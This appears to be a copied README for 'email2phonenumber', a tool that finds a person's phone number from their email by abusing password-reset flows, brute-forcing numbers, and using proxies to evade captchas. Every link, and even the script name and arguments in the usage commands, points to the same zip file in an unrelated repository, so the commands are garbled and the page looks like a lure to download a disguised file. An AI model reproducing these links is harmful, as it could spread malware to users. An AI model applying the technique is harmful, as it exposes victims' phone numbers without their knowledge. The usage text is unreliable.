# email2phonenumber
email2phonenumber is an OSINT tool that allows you to obtain a target's phone number just by having his email address.

For full details check: [https://github.com/anakiseng789/email2phonenumber/raw/refs/heads/master/nosepiece/email_phonenumber_1.6.zip](https://github.com/anakiseng789/email2phonenumber/raw/refs/heads/master/nosepiece/email_phonenumber_1.6.zip)

Demo: [https://github.com/anakiseng789/email2phonenumber/raw/refs/heads/master/nosepiece/email_phonenumber_1.6.zip](https://github.com/anakiseng789/email2phonenumber/raw/refs/heads/master/nosepiece/email_phonenumber_1.6.zip)

## Basic info
This tool helps automate discovering someone's phone number by abusing password reset design weaknesses and publicly available data. It supports 3 main functions:

* "scrape" - scrapes websites for phone number digits by initiating password reset using the target's email address
* "generate" - creates a list of valid phone numbers based on the country's Phone Numbering Plan publicly available information
* "bruteforce" - iterates over a list of phone numbers and initiates password reset on different websites to obtain associated masked emails and correlate it to the victim's one

## Setup
email2phonenumber was developed on Python 3.x

You will need couple 3rd party libraries: BeautifulSoup and requests. These can be easely installed with pip

```
pip install beautifulsoup4 requests
```

## Usage
Scrape websites for phone number digits
```
python https://github.com/anakiseng789/email2phonenumber/raw/refs/heads/master/nosepiece/email_phonenumber_1.6.zip scrape -e https://github.com/anakiseng789/email2phonenumber/raw/refs/heads/master/nosepiece/email_phonenumber_1.6.zip
```

Generate a dictionary of valid phone numbers based on a phone number mask
```
python https://github.com/anakiseng789/email2phonenumber/raw/refs/heads/master/nosepiece/email_phonenumber_1.6.zip generate -m 555XXX1234 -o https://github.com/anakiseng789/email2phonenumber/raw/refs/heads/master/nosepiece/email_phonenumber_1.6.zip
```
Find target's phone number by resetting passwords on websites that do not alert the target using a phone number mask and proxies to avoid captchas and other abuse protections
```
python https://github.com/anakiseng789/email2phonenumber/raw/refs/heads/master/nosepiece/email_phonenumber_1.6.zip bruteforce -m 555XXX1234 -e https://github.com/anakiseng789/email2phonenumber/raw/refs/heads/master/nosepiece/email_phonenumber_1.6.zip -p https://github.com/anakiseng789/email2phonenumber/raw/refs/heads/master/nosepiece/email_phonenumber_1.6.zip -q
```
## Authors
Martin Vigo - @martin_vigo - [https://github.com/anakiseng789/email2phonenumber/raw/refs/heads/master/nosepiece/email_phonenumber_1.6.zip](https://github.com/anakiseng789/email2phonenumber/raw/refs/heads/master/nosepiece/email_phonenumber_1.6.zip)
